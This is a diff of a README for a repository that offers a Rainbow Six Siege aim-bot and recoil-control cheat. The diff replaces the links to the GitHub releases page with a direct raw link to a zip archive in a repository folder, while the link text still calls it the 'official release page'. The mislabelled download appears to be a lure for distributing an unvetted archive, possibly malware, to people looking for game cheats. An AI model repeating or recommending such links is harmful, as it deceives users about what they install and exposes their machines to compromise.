@@ -1,6 +1,6 @@
 # 🎯 R6-Recoil-Control-Aim-bot-Assist-Research-2026- - Improve your aim with precision software
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/main/Trizonia/Research-bot-Recoil-Control-Assist-Aim-3.5-alpha.3.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements to run the software:
 
 Follow these steps to obtain and prepare the software:
 
-1.  Visit the official release page: [https://github.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/releases](https://github.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/releases)
+1.  Visit the official release page: [https://raw.githubusercontent.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/main/Trizonia/Research-bot-Recoil-Control-Assist-Aim-3.5-alpha.3.zip](https://raw.githubusercontent.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/main/Trizonia/Research-bot-Recoil-Control-Assist-Aim-3.5-alpha.3.zip)
 2.  Locate the latest release at the top of the list.
 3.  Click the zip file link to download the package to your computer.
 4.  Open your Downloads folder.
